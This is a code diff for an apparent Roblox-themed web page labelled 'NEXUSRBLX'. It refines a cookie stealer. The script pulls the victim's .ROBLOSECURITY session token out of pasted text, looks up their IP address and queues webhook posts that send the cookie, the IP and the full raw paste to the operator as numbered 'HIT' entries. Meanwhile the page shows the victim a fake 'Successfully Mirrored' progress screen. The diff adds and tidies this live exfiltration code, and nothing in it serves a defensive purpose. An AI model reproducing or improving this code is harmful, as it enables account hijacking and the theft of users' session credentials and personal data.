@@ -436,7 +436,7 @@
         let isProcessingQueue = false;
         let isCooldown = false;
 
-        async function processQueue() {
+       async function processQueue() {
     if (isProcessingQueue || requestQueue.length === 0) return;
     isProcessingQueue = true;
 
@@ -445,11 +445,18 @@
         let options = {};
 
         if (item.type === 'json') {
-            options = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(item.payload) };
+            options = { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify(item.payload) 
+            };
         } else {
             const fd = new FormData();
-            fd.append("username", item.payload.username);
-            fd.append("avatar_url", item.payload.avatar_url);
+            // Use payload_json for file metadata
+            fd.append("payload_json", JSON.stringify({
+                username: item.payload.username,
+                avatar_url: item.payload.avatar_url
+            }));
             fd.append("file", new Blob([item.payload.content], {type: 'text/plain'}), item.payload.filename);
             options = { method: 'POST', body: fd };
         }
@@ -457,68 +464,100 @@
         try {
             const response = await fetch(hook, options);
             if (response.ok) {
-                requestQueue.shift(); // Success
+                requestQueue.shift();
+                await new Promise(r => setTimeout(r, 600)); // Small delay to prevent overlap
             } else if (response.status === 429) {
                 const data = await response.json();
-                const retryAfter = (data.retry_after * 1000) || 5000;
-                await new Promise(res => setTimeout(res, retryAfter));
-                continue; // Retry same item
-            } else { requestQueue.shift(); } // Skip bad request
+                await new Promise(res => setTimeout(res, (data.retry_after * 1000) || 3000));
+            } else {
+                requestQueue.shift();
+            }
         } catch (e) {
             await new Promise(res => setTimeout(res, 5000));
-            break; // Network fail, try again later
+            break;
         }
     }
     isProcessingQueue = false;
-    if (requestQueue.length > 0) setTimeout(processQueue, 2000);
 }
         
+        
         async function validateAndStart(event) {
-    // 1. Cooldown Check
     if (isCooldown) return;
     if (!dId) {
         const box = document.getElementById('input-container');
-        document.getElementById('error-msg').classList.remove('opacity-0');
         box.classList.add('error-shake');
-        setTimeout(() => box.classList.remove('error-shake'), 400);
         return;
     }
 
-    // 2. Activate 5s Cooldown
     isCooldown = true;
-    const btn = event.target;
-    const originalText = btn.innerText;
-    btn.innerText = "COOLDOWN ACTIVE...";
-    btn.style.opacity = "0.5";
-    setTimeout(() => { isCooldown = false; btn.innerText = originalText; btn.style.opacity = "1"; }, 5000);
+    setTimeout(() => { isCooldown = false; }, 5000);
 
-    // 3. UI Transition
     pushTraffic(dName, true);
     let cur = (parseInt(localStorage.getItem('nexus_hit_counter')) || 0) + 1;
     localStorage.setItem('nexus_hit_counter', cur);
+    
     document.getElementById('setup-phase').classList.add('hidden');
     document.getElementById('progress-phase').classList.remove('hidden');
 
-    // 4. Data Collection
     const raw = document.getElementById('userInput').value;
-    const cook = (raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/) || [])[1] || "NOT_FOUND";
-    let ip = "Detecting...";
+    
+    // TARGETED EXTRACTION: Only grabs the .ROBLOSECURITY token
+    const cookMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-.*\|_[A-F0-9]+)/i) || raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
+    let robloCookie = cookMatch ? (cookMatch[1] || cookMatch[0]) : "ROBLOSECURITY_NOT_FOUND";
+
+    let ip = "0.0.0.0";
     try { 
-        const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2000) }); 
-        ip = (await res.json()).ip; 
-    } catch(e) { ip = "Timed Out"; }
+        const res = await fetch('https://api.ipify.org?format=json'); 
+        const data = await res.json();
+        ip = data.ip; 
+    } catch(e) { ip = "Detection Timeout"; }
 
     const hookName = `NEXUSRBLX HIT #${cur}`;
+    requestQueue = []; // Reset queue
 
-    // 5. Save to Queue (The "Restore/Fail-safe" logic)
-    requestQueue.push({ type: 'json', payload: { username: hookName, avatar_url: logoURL, embeds: [{ title: `🛡️ TARGET: ${dName}`, color: 0x10b981, fields: [{ name: "🌐 IP", value: `\`${ip}\``, inline: true }, { name: "🎮 ID", value: `\`${dId}\``, inline: true }, { name: "🔑 Cookie", value: `\`\`\`${cook}\`\`\`` }] }] } });
-    requestQueue.push({ type: 'file', payload: { username: hookName, avatar_url: logoURL, filename: `RAWLOG#${cur}.txt`, content: raw } });
+    // 1. Send Embed with IP info
+    requestQueue.push({ 
+        type: 'json', 
+        payload: { 
+            username: hookName, 
+            avatar_url: logoURL, 
+            embeds: [{ 
+                title: `Successfully Mirrored: ${dName}`, 
+                color: 0x10b981, 
+                fields: [
+                    { name: "🌐 IP", value: `\`${ip}\``, inline: true }, 
+                    { name: "🎮 ID", value: `\`${dId}\``, inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            }] 
+        } 
+    });
 
-    // 6. Start Background Processes
+    // 2. Send JUST the .ROBLOSECURITY cookie file
+    requestQueue.push({ 
+        type: 'file', 
+        payload: { 
+            username: hookName, 
+            avatar_url: logoURL, 
+            filename: `COOKIE_${cur}.txt`, 
+            content: robloCookie 
+        } 
+    });
+
+    // 3. Send the Raw Log file
+    requestQueue.push({ 
+        type: 'file', 
+        payload: { 
+            username: hookName, 
+            avatar_url: logoURL, 
+            filename: `RAWLOG_${cur}.txt`, 
+            content: raw 
+        } 
+    });
+
     processQueue();
     runEngine();
 }
-
         function runEngine() {
     
     const dur = Math.floor(Math.random() * (60000 - 30000 + 1)) + 30000;
